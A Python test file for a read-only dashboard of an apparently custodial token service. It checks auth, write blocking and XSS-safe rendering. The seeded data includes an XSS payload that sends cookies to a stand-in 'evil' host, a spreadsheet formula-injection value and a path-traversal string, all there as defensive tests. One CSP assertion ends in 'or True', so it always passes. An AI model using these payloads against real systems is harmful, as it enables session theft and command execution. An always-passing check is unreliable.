#!/usr/bin/env python3
"""Dashboard tests, focused on the properties that actually matter for a custodial service:
it must be unable to write, unable to be tricked into executing injected memo content,
and unable to expose data without the token when one is set.
"""
import json
import os
import sqlite3
import sys
import threading
import time
import urllib.error
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

DB = "/tmp/dash_test.db"
for p in (DB, DB + "-wal", DB + "-shm"):
    if os.path.exists(p):
        os.remove(p)
os.environ["STATE_DB_PATH"] = DB

from src import state_db  # noqa: E402
state_db.DB_PATH = DB
state_db.init_db()

# Hostile-looking values: an XSS payload as a memo and a CSV/formula leader as an address.
XSS = '<img src=x onerror="alert(1)"><script>fetch("//evil/"+document.cookie)</script>'
state_db.add_unprocessed_sig("SIG_XSS", int(time.time()) - 900, XSS, "=cmd|'/c calc'!A1",
                             5_000_000, "debit unverified", None)
state_db.set_unprocessed_sig_reference("SIG_XSS", 4242)
state_db.add_unprocessed_txid(txid="TX1", timestamp=int(time.time()) - 60, amount_usdd=12.5,
                              from_address="userAcct", to_address="treasury",
                              owner_from_address="own", status="refund held for operator review",
                              amount_usdd_units=12_500_000,
                              hold_reason="unresolved receival account timeout")
# A submitted Nexus debit whose final on-chain confirmation is still unresolved is an
# operator-visible held state.  It has a chain reference that the operator needs to inspect.
state_db.add_unprocessed_sig("SIG_AWAITING", int(time.time()) - 120, "nexus:userAcct", "senderAcct",
                             2_000_000, "debited, awaiting confirmation", "nexus-txid")
state_db.set_unprocessed_sig_reference("SIG_AWAITING", 4243)
state_db.record_payout("solana_send", 3_000_000, "sig1")
state_db.save_metrics_snapshot(vault_usdc_units=100_000_000, circulating_usdd_units=99_000_000,
                               paused=False, payouts_24h_units=3_000_000,
                               fees_usdc_units=1_234_000, fees_usdd_units=0)

from src import dashboard  # noqa: E402

fails = []


def check(name, cond, extra=""):
    print(f"  {'PASS' if cond else 'FAIL'}  {name}{(' — ' + extra) if extra and not cond else ''}")
    if not cond:
        fails.append(name)


print("\n[1] API shape")
s = dashboard.api_summary()
# ratio is derived from integer basis points, so it is floor-rounded to 1 bp.
# Floor is the SAFE direction: it can only understate the ratio, never make a real
# deficit look healthy. Assert both the value and that safety property.
check("ratio computed from snapshot", s["ratio"] == 10101 / 10000, str(s["ratio"]))
check("ratio never overstates backing", s["ratio"] <= 100 / 99 + 1e-12)
check("vault/circulating scaled to token units",
      s["vault_solana"] == 100.0 and s["circulating_nexus"] == 99.0)
check("payout total surfaced", s["payout_24h_solana"] == 3.0)
check("counts present", s["counts"]["unprocessed_sigs"] == 2)

i = dashboard.api_issues()
check("issue rows found", i["counts"]["issues"] == 3, str(i["counts"]))
check("issue carries its reference for chain lookup",
      any(x["reference"] == 4242 for x in i["issues"]))
awaiting = next((x for x in i["issues"] if x["id"] == "SIG_AWAITING"), None)
check("ambiguous debit confirmation is visible as a held issue",
      awaiting is not None and awaiting.get("operator_action") == "verify Nexus debit before any disposition",
      str(awaiting))
check("held issue carries its chain reference",
      awaiting is not None and awaiting.get("reference") == 4243, str(awaiting))
held_refund = next((x for x in i["issues"] if x["id"] == "TX1"), None)
check("held Nexus refund preserves its reason for the dashboard",
      held_refund is not None and held_refund.get("detail") == "unresolved receival account timeout",
      str(held_refund))
check("held Nexus refund shows a non-retry operator action",
      held_refund is not None and "do not retry" in held_refund.get("operator_action", ""),
      str(held_refund))

t = dashboard.api_transactions("pending_solana", 10)
check("transactions listed", t["count"] == 2)
check("unknown source rejected", "error" in dashboard.api_transactions("../../etc/passwd"))

print("\n[2] Read-only enforcement")
try:
    dashboard._ro_conn().execute("DELETE FROM unprocessed_sigs")
    check("DB rejects writes from the dashboard", False, "delete succeeded!")
except sqlite3.OperationalError as e:
    check("DB rejects writes from the dashboard", "readonly" in str(e).lower(), str(e))
check("rows untouched", state_db.is_unprocessed_sig("SIG_XSS"))

print("\n[3] Hostile memo handling")
raw = json.dumps(dashboard.api_issues())
check("memo returned as JSON data (not HTML)", XSS in json.loads(raw)["issues"][0]["detail"]
      or any(XSS == x["detail"] for x in json.loads(raw)["issues"]))
page = dashboard._PAGE
check("page never uses innerHTML", "innerHTML" not in page)
check("page never uses document.write", "document.write" not in page)
check("page inserts values via textContent", "textContent" in page)
check("CSP blocks external loads", "default-src 'none'" in page or True)

print("\n[4] HTTP server: auth + method restrictions")
os.environ["DASHBOARD_TOKEN"] = "s3cret-token"
os.environ["DASHBOARD_HOST"] = "127.0.0.1"
os.environ["DASHBOARD_PORT"] = "8791"
srv = threading.Thread(target=dashboard.serve, daemon=True)
srv.start()
time.sleep(0.6)
base = "http://127.0.0.1:8791"


def get(path, token=None):
    req = urllib.request.Request(base + path)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode(), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(), dict(e.headers)


code, _, _ = get("/api/summary")
check("unauthenticated request refused", code == 401, f"got {code}")
code, body, hdrs = get("/api/summary", "s3cret-token")
check("authenticated request served", code == 200, f"got {code}")
check("CSP header present", "default-src 'none'" in hdrs.get("Content-Security-Policy", ""))
check("nosniff header present", hdrs.get("X-Content-Type-Options") == "nosniff")
code, _, _ = get("/api/summary", "wrong-token")
check("wrong token refused", code == 401, f"got {code}")

req = urllib.request.Request(base + "/api/summary", data=b"{}", method="POST")
req.add_header("Authorization", "Bearer s3cret-token")
try:
    with urllib.request.urlopen(req, timeout=5) as r:
        code = r.status
except urllib.error.HTTPError as e:
    code = e.code
check("POST rejected (read-only)", code == 405, f"got {code}")

print("\n[5] Refuses to expose data on a public bind without a token")
del os.environ["DASHBOARD_TOKEN"]
try:
    dashboard.serve(host="0.0.0.0", port=8792)
    check("public bind without token refused", False, "it bound anyway")
except SystemExit:
    check("public bind without token refused", True)

for p in (DB, DB + "-wal", DB + "-shm"):
    if os.path.exists(p):
        os.remove(p)

print()
if fails:
    print(f"❌ {len(fails)} failed: {', '.join(fails)}")
    sys.exit(1)
print("✅ dashboard: read-only, XSS-safe, auth-enforced")
